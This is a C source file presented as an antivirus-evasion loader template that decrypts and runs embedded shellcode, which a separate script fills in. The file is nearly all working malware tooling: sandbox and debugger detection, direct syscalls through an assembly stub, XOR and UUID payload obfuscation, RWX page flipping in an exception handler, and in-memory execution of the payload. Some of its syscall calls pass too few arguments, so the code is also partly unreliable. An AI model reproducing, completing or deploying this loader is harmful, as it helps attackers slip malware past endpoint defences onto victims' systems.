/*
 * AI AV Evasion Loader Template
 * 编译: x86_64-w64-mingw32-gcc -o payload.exe loader_final.c -mwindows -Os -static -s -lrpcrt4 -lws2_32 -lntdll
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <rpc.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "ws2_32.lib")

EXTERN_C NTSTATUS NTAPI NtDelayExecution(BOOL Alertable, PLARGE_INTEGER DelayInterval);

/* Syscall stub — 7 args (syscall num + 6 parameters) */
__attribute__((naked)) static NTSTATUS sys7(DWORD num, ULONG_PTR a1, ULONG_PTR a2,
    ULONG_PTR a3, ULONG_PTR a4, ULONG_PTR a5, ULONG_PTR a6) {
    __asm__ volatile(
        "mov %%rcx, %%r10\n\t"
        "mov %%edx, %%eax\n\t"
        "mov %%r8,  %%rcx\n\t"
        "mov %%r9,  %%rdx\n\t"
        "mov 0x28(%%rsp), %%r8\n\t"
        "mov 0x30(%%rsp), %%r9\n\t"
        "mov 0x38(%%rsp), %%rax\n\t"
        "mov %%rax, 0x20(%%rsp)\n\t"
        "syscall\n\t"
        "ret"
    );
}

/* Anti-Sandbox */
static BOOL anti_sandbox_check(void) {
    LARGE_INTEGER delay;
    delay.QuadPart = -((LONGLONG)30000000);
    NtDelayExecution(FALSE, &delay);

    MEMORYSTATUSEX mem = { .dwLength = sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors <= 1) return TRUE;

    if (IsDebuggerPresent()) return TRUE;

    const char* dlls[] = {"sbiedll.dll","dbghelp.dll","api_log.dll",
        "dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll",NULL};
    for (int i=0; dlls[i]; i++)
        if (GetModuleHandleA(dlls[i])) return TRUE;

    return FALSE;
}

/* VEH */
static LONG WINAPI veh_handler(PEXCEPTION_POINTERS ex) {
    if (ex->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        DWORD old;
        VirtualProtect(ex->ExceptionRecord->ExceptionAddress, 0x1000,
                       PAGE_EXECUTE_READWRITE, &old);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

/* Dynamic syscall number extraction */
static DWORD get_ssn(const char* name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    BYTE* f = (BYTE*)GetProcAddress(ntdll, name);
    if (!f) return 0;
    for (int i=0; i<24; i++)
        if (f[i]==0xB8) return *(DWORD*)(f+i+1);
    return 0;
}

/* XOR decrypt */
static void xor_dec(unsigned char* d, size_t n, unsigned char* k, size_t kn) {
    for (size_t i=0; i<n; i++) d[i] ^= k[i%kn];
}

/* UUID deobfuscate */
static void uuid_deob(char** uuids, size_t cnt, unsigned char* out, size_t outlen) {
    size_t off=0;
    for (size_t i=0; i<cnt && off<outlen; i++) {
        UUID u;
        if (UuidFromStringA((RPC_CSTR)uuids[i],&u)!=RPC_S_OK) continue;
        size_t n=16;
        if (off+n>outlen) n=outlen-off;
        memcpy(out+off,&u,n);
        off+=n;
    }
}

/* === Shellcode placeholder — replaced by merge_loader.py === */
// SHELLCODE_PLACEHOLDER
// KEY_PLACEHOLDER

int main(void) {
    if (anti_sandbox_check()) return 0;
    AddVectoredExceptionHandler(1, veh_handler);

    /* Decrypt shellcode */
    xor_dec(encrypted_shellcode, encrypted_shellcode_len,
            decrypt_key, decrypt_key_len);

    /* Syscall numbers */
    DWORD na=get_ssn("NtAllocateVirtualMemory");
    DWORD nw=get_ssn("NtWriteVirtualMemory");
    DWORD np=get_ssn("NtProtectVirtualMemory");
    DWORD nt=get_ssn("NtCreateThreadEx");

    if (!na || !nw || !nt) {
        /* Standard API fallback */
        void* exec=VirtualAlloc(NULL, encrypted_shellcode_len,
                                MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        memcpy(exec, encrypted_shellcode, encrypted_shellcode_len);
        DWORD old;
        VirtualProtect(exec, encrypted_shellcode_len, PAGE_EXECUTE_READ, &old);
        HANDLE th=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)exec,NULL,0,NULL);
        WaitForSingleObject(th, INFINITE);
        CloseHandle(th);
        return 0;
    }

    /* Syscall path */
    void* exec_mem=NULL;
    SIZE_T sz=encrypted_shellcode_len;
    sys7(na, (ULONG_PTR)GetCurrentProcess(), (ULONG_PTR)&exec_mem, 0,
         (ULONG_PTR)&sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

    SIZE_T written;
    sys7(nw, (ULONG_PTR)GetCurrentProcess(), (ULONG_PTR)exec_mem,
         (ULONG_PTR)encrypted_shellcode, encrypted_shellcode_len,
         (ULONG_PTR)&written, 0);

    DWORD old;
    sys7(np, (ULONG_PTR)GetCurrentProcess(), (ULONG_PTR)&exec_mem,
         (ULONG_PTR)&sz, PAGE_EXECUTE_READ, (ULONG_PTR)&old, 0);

    HANDLE th;
    sys7(nt, (ULONG_PTR)&th, 0x1FFFFF, 0,
         (ULONG_PTR)GetCurrentProcess(), (ULONG_PTR)exec_mem, 0);

    WaitForSingleObject(th, INFINITE);
    CloseHandle(th);
    return 0;
}
